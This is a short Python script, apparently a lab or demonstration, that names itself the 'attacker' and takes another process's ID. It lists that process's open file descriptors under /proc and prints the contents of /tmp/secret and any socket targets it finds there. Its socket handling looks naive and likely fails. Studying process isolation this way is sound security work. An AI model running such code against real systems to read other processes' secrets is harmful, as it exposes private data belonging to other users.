import os
import sys
import socket

def main():

    pid = sys.argv[1]
    # pid = os.getpid()
    attacker_pid = os.getpid()


    print(f"Attacker pid: {attacker_pid}")
    print(f"Opening FD of foreign Process {pid}")
    path = f"/proc/{pid}/fd/"

    # fds = os.listdir(path)
    # print(f"FDs: {fds}")

    try:
        for fd in os.listdir(path):
            target = os.readlink(f"{path}/{fd}")
            print(fd, "->", target)

            if target == "/tmp/secret":

                with open(target, "r") as f:
                    data = f.read()
                    print(data)

            elif target.startswith("socket"):
                with open(target, "r") as f:
                    data = f.read()
                    print(data)

    except FileNotFoundError:
        print("Exception: FD", fd, ": No such file or directory")
    except PermissionError:
        print("Permission Denied")

if __name__ == '__main__':
    main()